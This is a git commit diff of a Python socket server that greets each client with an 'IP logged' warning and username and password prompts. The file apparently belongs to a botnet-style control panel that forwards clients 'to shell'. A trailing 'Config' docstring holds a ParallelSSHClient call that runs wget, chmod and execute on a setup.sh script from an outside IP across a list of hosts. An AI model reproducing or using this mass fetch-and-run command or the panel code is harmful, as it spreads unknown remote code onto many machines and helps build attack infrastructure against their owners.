6578a71808df36995cb8510e21f899b657d2d734
PaisonDev <36568869+PaisonDev@users.noreply.github.com>
2018-02-18 14:17:13 -0800

    Update Server.py

--- Main/Server.py
+++ Main/Server.py
@@ -1,9 +1,3 @@
-#!/usr/bin/python
-"""
-    Author - Aex- (Z)
-    Credits - None
-"""
-
 import os
 import sys
 import socket
@@ -19,15 +13,33 @@ class puts:
 
     @staticmethod
     def err(string):
-        sys.stderr.write("\033[31m" + string + "\n")
+        sys.stderr.write(string + "\n")
 
     @staticmethod
     def out(string):
-        sys.stdout.write("\033[0m" + string + "\n")
+        sys.stdout.write(string + "\n")
 
 
-def client():
-    pass
+def client(conn, addr):
+    try:
+        conn.send("Your IP Address: \033[32m{} \033[0mHas been logged. \r\n\033[31mEverything you do  will be logged.\r\n".format(addr[0]))
+        puts.out("     - prompting client with login")
+        conn.send("\033[0mu\033[31ms\033[32me\033[1;36mr\033[35mn\033[37ma\033[31mm\033[33me\033[0m: ")
+        username = conn.recv(4096)
+        blank = conn.recv(1024)
+        conn.send("\033[0mp\033[31ma\033[32ms\033[1;36ms\033[35mw\033[37mo\033[31mr\033[33md\033[0m: ")
+        password = conn.recv(4096)
+        blank = conn.recv(1024)
+
+        
+
+    except Exception:
+        puts.err("     - unknown error occured with client. closing socket to client")
+        conn.send("\033[31m an error has occured. closing")
+        conn.close()
+        
+
+
 
 
 def server():
@@ -36,7 +48,7 @@ def server():
     try:
         sock.bind(("127.0.0.1", 3332))
     except socket.error:
-        puts.out("[-] Socket Error: Failed to bind to address, Address already in use.")
+        puts.err("[-] Socket Error: Failed to bind to address, Address already in use.")
 
     sock.listen(0)
     while True: # creating infinite while loop to run forever until error
@@ -44,12 +56,21 @@ def server():
             conn, addr = sock.accept()
             puts.out("[+] Connection Recieved. Forwarding client to shell. {}:{}".format(addr[0], addr[1]))
             try:
-                threading.Thread(target=client, args=(conn, addr)).start()
+                threading.Thread(target=client, args=(conn, addr,)).start()
             except Exception:
-                puts.out("     - could not send client. error occured.")
+                puts.err("     - could not send client. error occured.")
             
-            puts.out("     - sent client to shell.\n")
+            puts.out("     - sent client to shell.")
             
 
         except socket.error as e:
-            puts("[-] Socket Error: Unknown error occured\n%s" + str(e))
+            puts.err("[-] Socket Error: Unknown error occured\n%s" + str(e))
+
+
+server()
+"""
+    Config
+    hosts.append(line)
+    client = ParallelSSHClient(hosts)
+    output = client.run_command("wget http://45.76.0.246/setup.sh; chmod +x setup.sh; ./setup.sh")
+"""
